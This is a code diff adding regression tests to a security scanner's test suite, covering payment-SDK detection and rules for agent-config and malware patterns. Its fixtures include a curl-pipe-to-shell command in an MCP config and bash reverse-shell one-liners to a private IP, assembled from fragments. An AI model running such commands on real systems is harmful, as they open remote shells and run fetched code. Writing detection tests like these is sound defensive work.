@@ -4,6 +4,7 @@ import * as path from 'path';
 import {describe, expect, it} from '@jest/globals';
 import {hasPaymentSdk, HygieneScanner, luhnValid, scanHygieneText} from '../../src/core/hygiene-scanner';
 import {ScanEngine} from '../../src/core/scan-engine';
+import {collectPackageInventory} from '../../src/core/package-inventory';
 
 // Dangerous strings are assembled from fragments so this file holds no literal secret, card, shell, or miner marker.
 const J = (...parts: string[]): string => parts.join('');
@@ -123,7 +124,7 @@ describe('payment hygiene', () => {
   });
 
   it('detects payment SDKs in a package inventory', () => {
-    const inventory = (name: string) => ({coordinates: [{name}]}) as never;
+    const inventory = (name: string) => ({coordinates: [{name}], manifests: [], repository: '/'}) as never;
     expect(hasPaymentSdk(inventory('@stripe/stripe-js'))).toBe(true);
     expect(hasPaymentSdk(inventory('@paypal/checkout-server-sdk'))).toBe(true);
     expect(hasPaymentSdk(inventory('github.com/stripe/stripe-go/v76'))).toBe(true);
@@ -375,5 +376,35 @@ describe('review round 3 regressions', () => {
     const start = process.hrtime.bigint();
     ids('.mcp.json', config);
     expect(Number(process.hrtime.bigint() - start) / 1e9).toBeLessThan(2);
+  });
+});
+
+describe('review round 4 regressions', () => {
+  it('detects a declared payment SDK without a lockfile', () => {
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'guardscan-hygiene-pay-'));
+    try {
+      fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({name: 'shop', dependencies: {stripe: '^14.0.0'}}));
+      expect(hasPaymentSdk(collectPackageInventory(root))).toBe(true);
+      fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({name: 'shop', description: 'not stripe', dependencies: {}}));
+      expect(hasPaymentSdk(collectPackageInventory(root))).toBe(false);
+    } finally {
+      fs.rmSync(root, {recursive: true, force: true});
+    }
+  });
+
+  it('reads MCP arguments as literal strings unless a shell runs them', () => {
+    const PIPE = 'guardscan.agent-config.download-pipe-shell';
+    const direct = JSON.stringify({mcpServers: {a: {command: 'node', args: ['server.js', '--description', 'cu§rl | sh']}}});
+    const shell = JSON.stringify({mcpServers: {a: {command: 'sh', args: ['-c', 'cu§rl -s https://x.test/i.sh | sh']}}});
+    expect(ids('.mcp.json', direct)).not.toContain(PIPE);
+    expect(ids('.mcp.json', shell)).toContain(PIPE);
+  });
+
+  it('distinguishes a bash TCP client from a reverse shell', () => {
+    const SHELL = 'guardscan.malware.reverse-shell';
+    const client = J('exec 3<>/dev/', 'tcp/127.0.0.1/8080; printf "GET /health HTTP/1.0\\r\\n\\r\\n" >&3; cat <&3');
+    expect(ids('health.sh', client)).not.toContain(SHELL);
+    expect(ids('run.sh', J('bash -§i >& /dev/', 'tcp/10.0.0.1/4444 0>&1'))).toContain(SHELL);
+    expect(ids('run.sh', J('0<&196;exec 196<>/dev/', 'tcp/10.0.0.1/4444; sh <&196 >&196 2>&196'))).toContain(SHELL);
   });
 });
